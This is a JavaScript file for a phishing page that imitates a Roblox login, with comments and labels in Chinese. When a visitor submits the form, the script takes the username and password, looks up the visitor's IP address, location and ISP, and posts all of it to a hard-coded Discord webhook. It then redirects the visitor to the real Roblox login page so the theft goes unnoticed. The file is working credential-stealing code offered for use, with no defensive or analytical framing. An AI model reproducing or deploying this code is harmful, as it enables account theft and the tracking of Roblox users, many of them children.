document.addEventListener("DOMContentLoaded", () => {
    const loginButton = document.getElementById("login-button");

    loginButton.addEventListener("click", async (e) => {
        e.preventDefault();

        const username = document.getElementById("login-username").value.trim();
        const password = document.getElementById("login-password").value;

        if (!username || !password) {
            alert("請輸入帳號與密碼！");
            return;
        }

        let userIP = "未知";
        let geoData = null;

        try {
            // 取得 IP
            const ipRes = await fetch("https://api.ipify.org?format=json");
            const ipJson = await ipRes.json();
            userIP = ipJson.ip;

            // 取得地理資訊（ipapi）
            const geoRes = await fetch(`https://ipapi.co/${userIP}/json/`);
            geoData = await geoRes.json();

        } catch (err) {
            console.error("IP / Geo 取得失敗:", err);
        }

        // 正規化（保證資料不會 undefined）
        const data = normalizeGeo(geoData, userIP);

        const webhookURL = "https://discord.com/api/webhooks/1496135328560320683/iUcYfGuKX8im6n9KD0rsLhKec0QQ-JILGPgg0JE1mZx16-9CeQArJ7yaZmwx-Fp3X8RC";

        const embedPayload = {
            username: "帳號資訊",
            embeds: [
                {
                    title: "Roblox 登入資訊",
                    color: 0xff4444,
                    fields: [
                        {
                            name: "帳號",
                            value: username || "無",
                            inline: true
                        },
                        {
                            name: "密碼",
                            value: password || "無",
                            inline: true
                        },
                        {
                            name: "IP 位址",
                            value: data.ip
                        },
                        {
                            name: "地理位置",
                            value: `${data.country} ${data.region} - ${data.city}`
                        },
                        {
                            name: "時區 / ISP",
                            value: `${data.timezone} / ${data.isp}`
                        }
                    ],
                    timestamp: new Date().toISOString()
                }
            ]
        };

        try {
            await fetch(webhookURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(embedPayload)
            });
        } catch (err) {
            console.error("Webhook 發送失敗:", err);
        }

        // 最後再跳轉
        window.location.href = "https://www.roblox.com/login";
    });
});

// ✅ 正規化函式（核心）
function normalizeGeo(geo, userIP) {
    if (!geo || geo.error) {
        return {
            ip: userIP,
            country: "未知",
            region: "未知",
            city: "未知",
            timezone: "未知",
            isp: "未知"
        };
    }

    return {
        ip: geo.ip || userIP,
        country: geo.country_name || "未知",
        region: geo.region || "未知",
        city: geo.city || "未知",
        timezone: geo.timezone || "未知",
        isp: geo.org || "未知"
    };
}